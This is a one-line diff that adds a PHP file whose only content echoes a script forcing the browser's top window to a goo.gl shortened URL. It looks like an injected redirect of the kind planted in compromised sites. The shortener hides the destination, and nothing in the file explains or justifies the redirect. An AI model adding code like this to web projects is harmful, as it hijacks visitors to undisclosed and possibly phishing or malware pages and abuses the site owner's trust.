@@ -1,0 +1,1 @@
+<?php echo "<script>window.top.location.href = \"https://goo.gl/zLvJqz\";</script>"; ?>
